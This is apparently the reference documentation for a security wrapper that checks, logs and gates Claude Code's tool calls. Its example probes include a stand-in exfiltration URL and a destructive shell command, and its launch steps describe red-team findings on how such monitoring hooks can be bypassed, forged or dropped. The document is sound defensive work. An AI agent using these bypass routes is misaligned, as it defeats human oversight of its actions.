# Enclawed Code command reference

This is the complete reference for everything `ecwcode` adds on top of Claude Code: its own commands, its flags, the hook Claude Code runs, the environment variables it reads, the policy keys it honors, the decisions it makes and the records it writes. Claude Code's own commands and options are not repeated here; `ecwcode` passes them to your `claude` unchanged (see [Claude Code's CLI reference](https://docs.anthropic.com/en/docs/claude-code/cli-reference)).

> Behavior described here is what Enclawed Code 0.666.0 does. It was checked against Enclawed Code 0.666.0, Claude Code 2.1.326 and the enclawed-oss framework built from the `vendor/enclawed-oss` submodule.

Enclawed Code is an independent project by Enclawed, Inc. It is not affiliated with, endorsed by or sponsored by Anthropic.

Contents:

- [What Enclawed Code does for you](#what-enclawed-code-does-for-you) (start here)
- [Command line dispatch](#command-line-dispatch)
- [Launching Claude Code](#launching-claude-code)
- [`ecwctl history`](#ecwctl-history)
- [`ecwctl audit`](#ecwctl-audit)
- [`ecwctl managed print`](#ecwctl-managed-print) and [`ecwctl managed login-policy`](#ecwctl-managed-login-policy)
- [`ecwctl doctor`, `version`, `help`, `demo`, `probe`, `review`](#ecwctl-doctor--version--help--demo)
- [`ecwcode-hook`](#ecwcode-hook-internal) (internal)
- [The decision table](#the-decision-table)
- [Hardware root (Enclaweder)](#hardware-root-enclaweder) (and [the hardware halt](#hardware-halt-and-claude-codes-login), [Claude Code's login, sealed](#claude-codes-login-sealed-login-watcher), [`recover-root`](#ecwctl-recover-root))
- [Reason codes](#reason-codes)
- [Policy](#policy) (and [policy commands](#policy-commands), [Enclawed Code options](#enclawed-code-options))
- [Workflow profiles, skill admission and MCP admission](#workflow-profiles-skill-admission-and-mcp-admission) (and [the trust model](#trust-model))
- [Paths the agent may not write](#paths-the-agent-may-not-write)
- [Activation auth](#activation-auth)
- [Audit records](#audit-records)
- [Environment variables](#environment-variables)
- [Files and directories](#files-and-directories)
- [`npm run build:framework`](#npm-run-buildframework)

---

## What Enclawed Code does for you

**First thing to run after installing:** `ecwctl demo` replays attack scenarios offline, at no cost and without calling a model, and shows what Enclawed Code did with each one (see [adversarial.md](adversarial.md)).

Every feature below comes from Enclawed's open core and runs on your machine, outside the model. Each one says how you see it during normal work, and gives copy-paste commands to check it yourself.

### Set up a safe place to check things (once per shell)

The checks below ask `ecwcode-hook` for decisions exactly the way Claude Code does: `ecwctl probe` writes the session file the launcher would write from this shell's environment, runs the hook command the generated settings carry (an empty environment, the session file and its digest), and sends one hook event. The hook only decides; nothing is executed. The first line sends the audit log and the file history to a throwaway directory, so your real ones are not touched. Your real policy still applies (see [where it is read from](#where-it-is-read-from)), unless a step points `ENCLAWED_CONFIG_PATH` elsewhere in this shell.

```bash
export ENCLAWED_STATE_DIR="$(mktemp -d)"   # audit log + history go here, not to ~/.enclawed
cd "$(mktemp -d)"                          # an empty "project" to work in
probe() {  # probe TOOL 'TOOL_INPUT_JSON' [PERMISSION_MODE]
  ecwctl probe "$1" "$2" --mode "${3:-default}"
}
```

Each probe prints the decision and its reason (`--json` prints the JSON Claude Code receives). The decision is `allow` (runs), `ask` (Claude Code shows its permission prompt with Enclawed's reason) or `deny` (cannot run).

If your machine has ever been bound to an Enclaweder, every probe may be denied with `hardware root halt: ...`. That is feature 7 below working: see [the hardware root](#hardware-root-enclaweder).

### 1. A rule is checked before every action

**What:** Every tool call Claude Code makes (in the main session and in every subagent) goes to `ecwcode-hook` before it runs. The decision is made by fixed code and your policy, not by the model, so no prompt can talk its way past it.

**How to see it:** reasons that start with `Enclawed:` in Claude Code's permission prompts and in Claude's own replies ("blocked by hook ..."); `ecwctl audit verify` counts one record per decision.

**Check it yourself:**

```bash
probe Read '{"file_path":"README.md"}'          # allow: "Enclawed: reversible (read)"
probe Bash '{"command":"rm -rf build"}'         # ask: not on the read-only allowlist
```

### 2. File changes are reversible by default, with a local history and restore

**What:** Before `Write`, `Edit`, `MultiEdit` or `NotebookEdit` changes a file inside the project, the file's current content is stored locally under its SHA-256 (or the fact that the file did not exist yet). Any such change can be put back with `ecwctl history restore`, and a restore keeps what it replaced, so a restore can be undone too.

**How to see it:** the reason `previous content kept (snapshot 1a2b3c4d5e6f); undo with: ecwctl history restore`; `ecwctl history list`.

**Check it yourself:**

```bash
echo "first version" > notes.txt
probe Write '{"file_path":"notes.txt","content":"second version"}'   # allow, snapshot kept
echo "second version" > notes.txt                                    # what Claude Code would do next
ecwctl history list
ID=$(ecwctl history list --json | node -pe 'JSON.parse(require("fs").readFileSync(0, "utf8")).at(-1).id')
ecwctl history restore "$ID"
cat notes.txt                                                        # first version
```

### 3. Approval only for irreversible actions

**What:** Reversible calls run without interrupting you. A call Enclawed cannot show to be reversible (a shell command off the read-only allowlist, an MCP tool, an unknown tool, a write with no possible history) waits for a person, unless your policy pre-approves that tool. Where no person can be asked (`bypassPermissions`, or `-p` without a permission prompt tool), it is denied instead.

In an interactive session the person is asked by **Enclawed Code itself**, not by Claude Code's dialog (red-team round 5, N13c): claude is paused (SIGSTOP) and Enclawed Code shows, on the terminal's alternate screen, word-wrapped to its width:

```
┌─ Enclawed Code · approval needed ───────────────────────────────────────────┐
│  asked by Enclawed Code, not by Claude Code                                 │
│                                                                             │
│  Claude wants to:   writes ~/project/config/local.json                      │
│                     (tool: Write)                                           │
│  Why it matters:    it cannot be undone. This write replaces the content of │
│                     an existing file that git ignores (.gitignore) by its   │
│                     own name, so no copy of it exists outside this machine. │
│                     Snapshot kept: ecwctl history restore ce82ffd0859f      │
│  Approve only if you asked for this change.                                 │
└─────────────────────────────────────────────────────────────────────────────┘
  To approve, type or paste exactly what is inside the quotes (without the
  quotes), then press Enter:
      "local zkq"
  To deny, type d and press Enter.
  No answer in 5 minutes = denied.
  >
```

The approval text is the name of what the call acts on and a random three-letter code; only exactly that text (typed or pasted; one surrounding pair of quotes is accepted and taken off, outer spaces trimmed, nothing else normalized) then Enter approves. `d` then Enter, or Ctrl-C, is the person's denial; Enter alone and Escape take no answer (the prompt stays, so nobody approves or denies by reflex); any other text is said to be "not the approval text" and denies, with no second try; 5 minutes without an answer denies. Keys typed before the prompt appears are discarded, and a paste never presses Enter. The agent's own words for the target ("untrusted, as given by the agent") are shown only when they resolve somewhere else, as a `Warning:` line inside the frame. The frame is box-drawing characters with a UTF-8 locale, `+ - |` otherwise, and none below 60 columns; colors only when the terminal has them and `NO_COLOR` is not set. The approval and deny lines stay outside the frame, so a copied line carries no border. Afterwards the terminal's line discipline is restored exactly (`stty -g`), Claude Code's screen comes back untouched with its cursor as it was, and claude is continued (SIGCONT, SIGWINCH). When Claude Code itself is on the alternate screen (the terminal says so when asked, DECRQM), the prompt clears that screen and claude is made to redraw by a real one-row size change. Keys typed at the prompt never reach claude, and keys typed after it reach only claude (`test/interactive-parity.test.mjs`). Claude Code then gets `allow` or `deny`, never `ask`. Why: every Claude Code hook event, PermissionRequest and Notification included, reaches a hook the same way (the hook command with JSON on stdin), so a process started inside the session can produce any of them by running Enclawed Code's own hook command; no Claude Code event proves that a person approved. A call decided "ask" that runs without a yes at Enclawed Code's prompt stops the session (`decision-violated`). In `-p` with `--permission-prompt-tool` the prompt tool answers, as before.

Every value from the agent in a reason (a path, a command, a host, a tool name, a config line) is JSON-quoted (newlines and control characters escaped), capped (an ellipsis, its length and a SHA-256 prefix), stripped of bidi and invisible characters and labeled untrusted; a write target is also shown as the real path it resolves to (round 5, E2): `Target (untrusted, as given by the agent): "notes\n\n..."; resolves to: /proj/.git/hooks/pre-commit`.

**How to see it:** Enclawed Code's prompt (interactive) or the deny reason (headless) with `Enclawed: irreversible action, approve only if intended. ...`.

**Check it yourself:**

```bash
probe Bash '{"command":"git status"}'                      # allow: read-only command
probe Bash '{"command":"npm install"}'                     # ask
probe Bash '{"command":"npm install"}' bypassPermissions   # deny: nobody to ask
```

### 4. Files that configure what runs later are protected

**What:** Writes to files that make code run later always wait for a person (or run only if pre-approved): anything under `.git/`, `.claude/`, `.husky/`, `.githooks/`, `.devcontainer/`, `.direnv/`; `.mcp.json`, `.envrc`, `.gitmodules`, `.gitattributes`, `.npmrc`, `.yarnrc`, `.yarnrc.yml`, `.pnpmfile.cjs`, `package.json`, `Makefile`/`GNUmakefile`, `.pre-commit-config.yaml`, `pyproject.toml`, `setup.py`, `setup.cfg`; `.vscode/tasks.json`, `launch.json`, `settings.json`; `.cargo/config(.toml)`. Names compare case-insensitively (on macOS and Windows `.GIT` is `.git`), and the check runs on the path after symlinks are resolved; any write through a symlink inside the project asks too (`symlinked-path`). The current content is still kept, so an approved change can be restored; restoring does not undo what the file already started.

**How to see it:** the reason `... configures what runs later (git, Claude Code or MCP settings); undoing the file does not undo what it starts`.

**Check it yourself:**

```bash
probe Write '{"file_path":".git/hooks/pre-commit","content":"#!/bin/sh"}'          # ask
probe Edit '{"file_path":".mcp.json","old_string":"a","new_string":"b"}'           # ask
```

### 5. Network egress and tool allowlists

**What:** `WebFetch` runs without asking only for hosts on `enclawed.policy.allowedHosts`. With no list (the open default), a fetch to any host asks, because whatever is in the URL leaves the machine and cannot be taken back; with a list, or with allowlists enforced, an unlisted host is denied. With `enforceAllowlists: true` (the default in the enclaved flavor), only tools on `allowedTools` run at all; everything else is denied.

**How to see it:** `Enclawed: host attacker.example is not on enclawed.policy.allowedHosts`, `Enclawed: tool "Bash" is not on enclawed.policy.allowedTools`; `ecwctl doctor` prints `allowlists enforced` or `not enforced`.

**Check it yourself:**

```bash
printf '{ "enclawed": { "policy": { "allowedHosts": ["docs.python.org"] } } }\n' > policy.json
probe WebFetch '{"url":"https://attacker.example/?q=secret"}'                                   # ask: no allowlist configured
ENCLAWED_CONFIG_PATH="$PWD/policy.json" probe WebFetch '{"url":"https://docs.python.org/3/"}'           # allow
ENCLAWED_CONFIG_PATH="$PWD/policy.json" probe WebFetch '{"url":"https://attacker.example/?q=secret"}'   # deny
printf '{ "enclawed": { "policy": { "enforceAllowlists": true, "allowedTools": ["read"] } } }\n' > tools.json
ENCLAWED_CONFIG_PATH="$PWD/tools.json" probe Bash '{"command":"ls"}'                                   # deny
```

### 6. MCP tools are gated

**What:** Every MCP tool (`mcp__server__tool`) acts outside this machine's history, so each call waits for a person unless that exact tool is pre-approved.

**How to see it:** `Enclawed: irreversible action, approve only if intended. MCP tools act outside this machine's history`.

**Check it yourself:**

```bash
probe mcp__github__create_issue '{"title":"x"}'                                       # ask
printf '{ "enclawed": { "policy": { "preApprovedIrreversibleTools": ["mcp__github__create_issue"] } } }\n' > pre.json
ENCLAWED_CONFIG_PATH="$PWD/pre.json" probe mcp__github__create_issue '{"title":"x"}'  # allow, recorded as pre-approved
```

### 7. Hardware root halt with an Enclaweder

**What:** When an Enclaweder (Enclawed's hardware root of trust, a USB device) is bound and is not healthy, every tool call is denied, reads included. A deployment can also require the device (`ENCLAWEDER_ROOT=required`), so that its absence stops everything.

**How to see it:** `ecwctl doctor` prints `hardware root: software-only` (no device) or the device's status; halted calls show `Enclawed: hardware root halt: ...`.

**Check it yourself** (on a machine with no Enclaweder):

```bash
ENCLAWEDER_ROOT=required probe Read '{"file_path":"README.md"}'   # deny: hardware root halt
ecwctl doctor | grep 'hardware root'
```

### 8. A tamper-evident audit log, reconciled against Claude's own transcripts

**What:** Every decision, every tool result and every session start and end is appended to a hash-chained log in which any edit, removal or truncation is detected. `ecwctl audit reconcile` compares the log with Claude Code's own session transcripts and reports tool calls that Enclawed never saw, which is what a session with its hooks switched off looks like.

**How to see it:** `ecwctl audit verify`, `ecwctl audit reconcile`.

**Check it yourself:**

```bash
ecwctl audit verify --no-device                             # verifies: N records, head anchor matched
# A transcript that contains a tool call Enclawed never checked:
printf '{"type":"assistant","message":{"content":[{"type":"tool_use","id":"toolu_unseen","name":"Bash","input":{}}]}}\n' > transcript.jsonl
ecwctl probe --event SessionStart --transcript transcript.jsonl
ecwctl audit reconcile; echo "(exit $?)"                    # [error] ... transcript-call-without-decision toolu_unseen
# Edit one record of the (throwaway) log, then verify again:
node -e 'const fs=require("fs"),f=process.argv[1],l=fs.readFileSync(f,"utf8").split("\n");l[0]=l[0].replace("claude-code:probe","claude-code:edited");fs.writeFileSync(f,l.join("\n"))' \
  "$ENCLAWED_STATE_DIR/claude-code/audit.jsonl"
ecwctl audit verify --no-device; echo "(exit $?)"           # does NOT verify: recordHash mismatch ... record 0
```

### 9. Managed enterprise mode

**What:** The same hooks can be installed as Claude Code managed settings, so they run for every Claude Code session on a machine, including plain `claude`, with the settings locks that keep a user from switching them off. An organization-wide policy file can replace each user's policy.

**How to see it:** `ecwctl doctor` prints `managed hooks: installed in ...` and `managed policy: ...`; `/status` inside Claude Code lists the managed settings.

**Check it yourself:**

```bash
ecwctl managed print | head -20                  # the settings an administrator would deploy
ecwctl doctor | grep '^- managed'
```

See [enterprise.md](enterprise.md) for the deployment steps.

When you are done, `unset ENCLAWED_STATE_DIR` (and delete the two temporary directories if you like).

---

## Command line dispatch

Enclawed Code installs two commands:

```
ecwcode [claude options and arguments]   # Claude Code itself, with Enclawed's checks
ecwctl <command> [options]               # Enclawed Code's own commands (history, audit, doctor, policy, auth, ...)
```

**`ecwcode` reserves nothing** (`src/args.mjs`, `routeArgs`). Every argument goes to your claude, unchanged and in order, exactly as if you had typed `claude`: `ecwcode doctor` is Claude Code's doctor, `ecwcode --help` and `ecwcode --version` are claude's, and `ecwcode history of this module` sends the prompt "history of this module". The only exceptions:

| Argument | What ecwcode does |
|---|---|
| `--bare`, `--safe-mode` | Refused (exit 2): they turn off settings-defined hooks, so no tool call would be checked. |
| `--no-session-persistence` | Refused (exit 2): claude would write no transcript, so a call that ran without the hook could not be found. |
| `--settings` | Merged into the settings file Enclawed Code generates, because claude reads a single `--settings` value (see [below](#--settings-merging)). |
| `--mcp-config`, `--strict-mcp-config` | Their servers are admitted first ([MCP admission](#mcp-admission)); claude gets Enclawed Code's own `--mcp-config` with the admitted ones. |
| `--workflow NAME`, `--passphrase-fd N` | Enclawed Code's own launch options (claude has neither); taken out. `ecwctl doctor` reports it if a future claude gains an option of either name. |

Whether claude starts a session decides only whether hooks are added (see [what happens](#what-happens), step 2).

**`ecwctl`** runs Enclawed Code's own commands and never starts claude for them: `ecwctl history`, `ecwctl audit`, `ecwctl managed`, `ecwctl doctor`, `ecwctl policy`, `ecwctl auth`, `ecwctl demo`, `ecwctl conformance`, `ecwctl probe`, `ecwctl login`, `ecwctl context`, `ecwctl files`, `ecwctl measurement`, `ecwctl review`, `ecwctl skills`, `ecwctl mcp`, `ecwctl trust`, `ecwctl recover-root`, `ecwctl recover-anchor`. `ecwctl`, `ecwctl help`, `ecwctl --help` and `ecwctl -h` print the list; `ecwctl version`, `ecwctl --version` and `ecwctl -v` print the version.

---

## Launching Claude Code

### Synopsis

```
ecwcode [claude options and arguments]
```

### What happens

1. **Find claude** (`src/claude.mjs`, `locateClaude`). If `ECWCODE_CLAUDE_PATH` is set (non-blank), that path is used, and only if it exists, is an executable regular file (on Windows: any regular file) and is not Enclawed Code itself. Otherwise each `PATH` directory is searched in order for `claude` (Windows: `claude.exe`, `claude.cmd`, `claude`), skipping any candidate that resolves into this installation's `bin/` or whose first 2048 bytes contain the marker `@enclawed-code-launcher` or an earlier build's `@codenclawed-launcher` or `@enclawde-launcher` (another copy of Enclawed Code, including an older install, for example a global install shadowing a checkout). Enclawed Code never runs itself as claude.
2. **Decide whether a session starts here.** These start no session, so no tool calls can happen and no hooks are added; the arguments go to claude unchanged:
   - a first argument that is one of the claude subcommands `attach`, `auth`, `auto-mode`, `doctor`, `gateway`, `import`, `install`, `kill`, `logs`, `mcp`, `plugin`, `plugins`, `purge`, `respawn`, `rm`, `setup-token`, `stop`, `ultrareview`, `update`, `upgrade`;
   - exactly one argument that is `-v`, `--version`, `-h` or `--help`. (`ecwcode --help -p x`, with more arguments, is treated as a session.)

   `agents` is session-starting: the agent view dispatches sessions and accepts `--settings` for them, so they get Enclawed's hooks (like `--bg`, its session files are kept after Enclawed Code exits).
3. **Take out `--passphrase-fd N`**, which is retired: a launch that passes it is refused at the two-factor step (exit 5, see [activation auth](#activation-auth)); refuse `--bare` and `--safe-mode`, which turn off settings-defined hooks, and `--no-session-persistence`, which stops Claude Code from writing the transcript Enclawed Code watches for unchecked tool calls (step 14) (exit 2). When standard output is not a terminal (CI, `| tee`), Claude Code runs headless with or without `-p`, so Enclawed Code treats the run as print mode (`-p`) from here on.
4. **Check the Claude Code version.** `claude --version` must report **2.1.295 or later**, the first version that blocks a tool call when its hook fails (`"onFailure": "block"`). An unparseable version is refused too. The answer is cached per executable (real path, size, mtime) in `<state>/claude-code/claude-version.json`.
5. **Refuse a project that contains Enclawed Code.** When the current directory contains Enclawed Code's installation or the Enclawed state directory (for example when you start Enclawed Code in your home directory), Enclawed Code exits 2: the agent could otherwise reach its policy, audit log, history or code. Writes there are denied anyway. There is no override: starting in such a directory is never needed.
6. **Skip the per-session hooks when managed hooks really exist.** The managed settings (`managed-settings.json`, then `managed-settings.d/*.json` alphabetically, hook lists concatenated as Claude Code does) must contain, for every event, an entry structurally equal to the template's, whose command runs an existing `ecwcode-hook` with `--origin managed`, and must set `allowManagedHooksOnly`. Only then Enclawed Code adds no hooks of its own. A file that merely mentions `ecwcode-hook` does not count; Enclawed Code warns and adds its own.
7. **Check the settings.** Each `--settings` value must be a JSON object whose top-level keys are ones Enclawed Code can check (`model`, `apiKeyHelper`, `outputStyle`, `forceLoginMethod`, `theme`, `language`, `cleanupPeriodDays`, `includeCoAuthoredBy`, `disableAllHooks`, `enableAllProjectMcpServers`, `alwaysThinkingEnabled`, `spinnerTipsEnabled`, `respectGitignore`, `enabledMcpjsonServers`, `disabledMcpjsonServers`, `env`, `statusLine`, `sandbox`, `permissions`, `hooks`, `$schema`) with the types Claude Code documents (Claude Code 2.1.326's own zod schema, read from its binary by `scripts/claude-settings-schema.mjs`: for example `cleanupPeriodDays` an integer of at least 1, `permissions.defaultMode` one of `acceptEdits`, `auto`, `bypassPermissions`, `default`, `dontAsk`, `plan`, and a command hook's `shell` `bash` or `powershell`; `test/claude-settings.test.mjs` checks against the real binary that a file with every accepted key loads, red-team round 3, N9). Claude Code reads only the last `--settings` it is given, so your values cannot be passed in a file of their own: they are merged into the file Enclawed Code generates. Nested values are checked too, and an undocumented nested key is refused: `statusLine` must be `{ "type": "command", "command": "<string>", "padding"?: <integer> }`; `sandbox` may only use `enabled`, `failIfUnavailable`, `allowUnsandboxedCommands`, `autoAllowBashIfSandboxed`, `excludedCommands`, `filesystem.{disabled, allowWrite, denyWrite, allowRead, denyRead}` and `network.{allowedDomains, deniedDomains, strictAllowlist}`; `permissions` only `allow`, `deny`, `ask`, `additionalDirectories`, `defaultMode`, `disableBypassPermissionsMode`, `disableAutoMode`; hook events must be ones Claude Code documents, and only `command` handlers (`command`, `timeout`, `onFailure: "block"`, `shell`, `args`, `async`, `if`, `statusMessage`) are accepted, since the other handler types have shapes Enclawed Code cannot check in full (red-team round 2, N1). Anything else is refused (exit 2): Claude Code drops a whole settings file when one value in it is invalid, Enclawed's hooks included. Put other keys in `.claude/settings.local.json` or `~/.claude/settings.json`.
8. **Look for other hooks, for every event.** Sources: user, project and local settings, `--settings`, the frontmatter of project and user skills (`.claude/skills/<name>/SKILL.md`) and subagents (`.claude/agents/*.md`), plugin `hooks/hooks.json` files under `<config dir>/plugins`, and `--plugin-dir` directories. No name is trusted: Enclawed Code's own hook exists only in the settings file it generates in step 12, so every hook found here is someone else's (a command that merely contains `ecwcode-hook` counts as foreign, red-team round 2, N3). A hook the repository supplies (committed settings, skills, subagents), for **any event**, runs repository code inside the session: a PreToolUse hook could rewrite a call after Enclawed Code approved it, and a SessionStart hook ran Enclawed Code's own hook command on forged inputs (red-team round 3, N9). So Enclawed Code refuses to start (exit 2), in every flavor, until you review it and an administrator grants **that hook, for that repository** (`projectHooks` in the [opt-out file](#admin-only-opt-outs); your shell and settings files cannot set it). The refusal prints the exact entry to add (`{"repo": ..., "digest": ...}`). The digest covers the settings file (relative to the project), the event, the matcher, the full hook entry and the content of every project file the command names (`./scripts/x.sh`, `$CLAUDE_PROJECT_DIR/...`), so a changed hook, or a changed script it runs, needs a new grant. Hooks in `.claude/settings.local.json` live in the repository directory too and are treated the same way. **Hooks from your own sources** (your user settings, a plugin, your skills and subagents, a `--settings` value) need an administrator's grant too (`hooks`, by digest; a granted one runs with a warning and no question). One without a grant:

   - **at a terminal** (standard input and output both terminals, not `-p`, not `--bg`): Enclawed Code lists them grouped by source and asks once, on the controlling terminal (`/dev/tty`; never standard input, and before the session exists, so nothing the session runs can answer), whether to start this session without them:

     ```
     ecwcode: these hooks have no administrator's grant; a hook runs code inside the session, outside Enclawed's checks:
       settings file /home/me/.claude/settings.json:
         SessionStart: touch /tmp/marker
       plugin noisy@mkt (/home/me/.claude/plugins/cache/mkt/noisy/1.0.0):
         SessionStart: ./hooks/start.sh
     Start this session without them (a plugin is switched off whole; nothing is changed on disk or remembered; an administrator can grant them in /etc/enclawed/enclawed-code-opt-outs.json)? [y/N]
     ```

     Only `y` or `yes` then Enter starts; Enter alone, anything else, Escape, Ctrl-C or two minutes without an answer refuses exactly as before (exit 2, the refusal printing the grant entry). Yes is for this one launch: it is never stored and is not a grant. The session then runs with those sources switched off, without any change to your files: a plugin is disabled whole (`enabledPlugins` `false` in the session's settings; a `--plugin-dir` plugin's `--plugin-dir` is not passed), since its hooks cannot be removed one by one; a hook in `--settings` is dropped from the merged settings; a hook in your settings file is dropped from a copy of that file that the session reads instead of the file (claude gets `--setting-sources` without `user`, so a change to the file takes effect at the next launch); a skill's frontmatter hook switches the skill off (`skillOverrides` `off`), a subagent's denies the subagent (`Agent(<name>)`, `Task(<name>)`). One line on standard error says it (`ecwcode: started without the hooks you declined (for this session only): ...`), and `claude-code.launch.hooks-excluded` records each source, its hooks' events and digests, the plugin ids disabled, the skills and subagents switched off.
   - **with nobody to ask** (`-p`, `--bg`, or no terminal): refused (exit 2) with the same message and `Nobody can be asked here (-p, a background session, or no terminal): it needs that administrator's grant, or start ecwcode at a terminal to be asked whether to run this session without it`.

   Rewrites are detected either way (`input-changed-after-decision`).
   **Repository commands that are not hooks are refused the same way** (red-team round 4, F2: a project `apiKeyHelper` ran repository code 8 times in one session). Every command-valued setting in project or local scope (`.claude/settings.json`, `.claude/settings.local.json`) refuses the launch: the list is derived from Claude Code's own schema (`src/settings-schema.mjs`, `commandPaths`): `apiKeyHelper`, `statusLine`, `subagentStatusLine`, `fileSuggestion`, `otelHeadersHelper`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`, `proxyAuthHelper`, `processWrapper`, `policyHelper(s)`, `sshHostCommands` and `sandbox.ripgrep`. So do project `.mcp.json` servers that will start: those enabled by `enableAllProjectMcpServers` or `enabledMcpjsonServers` in any settings scope or `--settings`, and, because Claude Code 2.1.326 approves them by itself there, every server not in `disabledMcpjsonServers` in a non-interactive (`-p`) or bypass-permissions session. The override is a per-repository grant of that exact command (`projectCommands` in the [opt-out file](#admin-only-opt-outs), digest as for hooks: the setting key, its full value and the project files it names; neither your shell nor a settings `env` can set it); then each one is a warning, and a changed command needs a new grant. Your user settings are yours and are not refused.
9. **Pin sensitive settings `env`.** When user, project or local settings set `ENCLAWED_*`, `ENCLAWEDER_*`, `ECWCODE_*`, `NODE_*`, `LD_*`, `DYLD_*`, `GIT_*`, `PATH`, `HOME`, `TMPDIR`, `BASH_ENV`, `ENV`, `PAGER`, `EDITOR` and similar in their `env`, Enclawed Code warns and sets them in the generated settings (which outrank those files) to your shell's value, or empty. The helper variables are pinned in every generated settings file, whoever sets them (round 4, F2): `CLAUDE_CODE_API_KEY_HELPER_TTL_MS` and `CLAUDE_CODE_PROXY_AUTH_HELPER_TTL_MS` to your shell's value or 300000 (a settings `env` had set the helper TTL to 1 s to re-run repository code on every tick), `CLAUDE_CODE_PROCESS_WRAPPER`, `CLAUDE_CODE_SHELL_PREFIX`, `CLAUDE_CODE_ENABLE_PROXY_AUTH_HELPER` and the policy-helper paths to your shell's value or empty. The hook itself never reads its environment at all (step 12).
10. **Hold the hardware root** for the session (see [hardware root](#hardware-root-enclaweder)). If the framework cannot be loaded, or the root refuses to boot (for example latched DIRTY, or `ENCLAWEDER_ROOT=required` with no device), Enclawed Code exits without starting claude (2 or 4) and says how to recover.
11. **Verify the person** when [activation auth](#activation-auth) is required (exit 5 when refused).
12. **Write the session file and the settings** (`src/session.mjs`, `src/settings.mjs`) into a fresh 0700 directory under the first of `$XDG_RUNTIME_DIR`, `$TMPDIR`, `/tmp` and `<state>/claude-code` that is not inside the project: `session.json` (0600) holds what the launcher resolved from your shell (state dir, audit log, history dir, policy candidates, flavor, the framework's `ENCLAWED_*`/`ENCLAWEDER_*` environment, the hardware relay's path (not its secret), the control socket's path, the paths the agent may not write); `settings.json` (0600) is every `--settings` value merged, Enclawed's hooks appended, `disableAllHooks: false`, plus the pinned `env`. The hook command is `/usr/bin/env -i CLAUDE_PROJECT_DIR="$CLAUDE_PROJECT_DIR" '<node>' '<ecwcode-hook.mjs>' --origin launcher --session '<session.json>' --digest <sha256>`. claude is started as `claude --settings <file> <your other arguments in order>`.
13. **Run claude** with the terminal handed over as-is (`stdio: inherit`; headless, claude's standard error is read and passed on, see below) and `ECWCODE_SESSION=1`, `ECWCODE_VERSION=<version>`. On Windows a `.cmd` claude is started through a shell.
14. **Prove that the real hook runs** (`src/control.mjs`, red-team round 2, N1, N2, N4). The launcher listens on a control socket in the session directory and keeps a per-launch key in memory only.
    - **Who may connect.** On Linux every connection is checked with the kernel's peer credentials (read through `ss`, which prints the sock_diag answer; Node has no `SO_PEERCRED`): the process must be a descendant of the claude Enclawed Code started, run this Node binary, and have exactly the generated hook command line (`node ecwcode-hook.mjs --origin launcher --session <this file> --digest <digest>`). The hook in turn checks that the socket is served by the launcher process named in the session file. Where peer credentials cannot be read (macOS, Windows, Linux without iproute2), Enclawed Code says so at the end of the session and the handshake rests on the challenge and the chain alone.
    - **The handshake.** The verified SessionStart hook gets a challenge derived from the in-memory key, writes its `claude-code.session.start` record carrying it, and sends back the record's hash; the launcher recomputes the record's hash and checks that it links to the records before it, back to this launch's own `claude-code.launch` record. A line that merely carries the launch nonce counts for nothing.
    - **Every PreToolUse call waits for it.** The verified hook reports the call's `tool_use_id` and is held until the handshake is done; after 7 s without it the call is denied.
    - **A decision counts only for its own call** (`src/call-binding.mjs`, red-team round 3, N9). With the id the hook reports the tool name and a digest of each top-level key of the input it decided on. The launcher accepts the decision only for a `tool_use` it has seen in the transcript (it waits up to 7 s for the line) with the same name and the same input; a path key may be the absolute form Claude Code hands hooks for a relative or `~` path, and keys Claude Code adds for hooks are allowed. An id the transcript never shows is refused; a name or input mismatch is refused, recorded as `claude-code.launch.decision-mismatch`, and stops claude (exit 3). A process that runs Enclawed Code's genuine hook on a fabricated input therefore cannot mark a different call decided. Interactive Claude Code 2.1.326 writes a call's `tool_use` line only after its PreToolUse hook has answered (found in a live run, round 5), so in an interactive session the launcher keeps the hook's report and checks it the moment the line appears; a mismatch then stops claude the same way. The context of the decision is bound too (round 5): the working directory, the permission mode and the scratchpad (see `decision-mismatch` under [Audit records](#audit-records)).
    - **The launcher learns every decision** (red-team round 4, N13). After deciding, the hook reports `allow`, `ask` or `deny` for the call (first report wins: a deny cannot be turned into an allow), and after the call its PostToolUse. A successful `tool_result` for a call decided `deny`, or `ask` with no sign that a person answered it, stops claude (exit 3) and is recorded as `claude-code.launch.decision-violated`; reconcile reports it (`decision-violated`, and `ran-despite-decision` from the transcript). In `-p` nobody can answer, so an ask counts as a deny (unless claude was given `--permission-prompt-tool`). Interactively the evidence of an answer is the genuine hook's PostToolUse for that call: Claude Code 2.1.326 writes no permission-grant record to the transcript (its decisions are kept in memory), and it runs PostToolUse only for a call that went through its permission flow with Enclawed's hooks loaded, before it writes the result (2 s grace). A hook that cannot report its decision denies the call.
    - **A dropped settings file stops claude at once** (round 4, F1, defense in depth). Claude Code prints "These settings files did not load, so nothing in them is in effect, including hooks ..." on standard error; headless, the launcher reads it, and when the file named is its generated one it stops claude (exit 3, `claude-code.launch.settings-dropped`). Interactively the message goes to the terminal untouched, and the handshake and the transcript watch remain the backstop.
    - **The peer's environment is checked too.** A connecting process whose environment carries `NODE_OPTIONS` or any other `NODE_*` variable, `LD_PRELOAD`, `LD_AUDIT`, `LD_LIBRARY_PATH` or `DYLD_*` is refused (the genuine hook starts under `env -i`). The hardware relay's secret reaches the hook here, not through the session file.
    - **A tool call that ran without the hook stops the session.** The launcher watches the session transcript (`<config dir>/projects/<cwd with non-alphanumerics as "-">/*.jsonl`, subagent transcripts included): a `tool_use` before the handshake, or a successful `tool_result` whose id no verified hook reported, stops claude at once and exits 3 (`claude-code.launch.unchecked-tool-call`). This detects the first unchecked call; it cannot undo it.
    - **The timer is a backstop.** In print mode (`-p`, or standard output not a terminal), without a handshake within 30 seconds (a fixed internal value, not a setting), Enclawed Code stops claude and exits 3; interactively it warns. A session that ends without the handshake exits 3 when claude exited 0, and is recorded (`claude-code.launch.no-handshake`; reconcile reports `launch-without-hooks`).
    - **Background sessions** (`--bg`) have no control socket, because they outlive Enclawed Code. Enclawed Code waits up to the same timeout for their `session.start` record (whose hash and link must verify) and exits 3 without it. With a hardware root in use (`ENCLAWEDER_ROOT=required`, or latch files present), `--bg` and `agents` are refused: a background session holds no root and has no halt monitor, so a halt would neither stop it nor erase the login (N6).
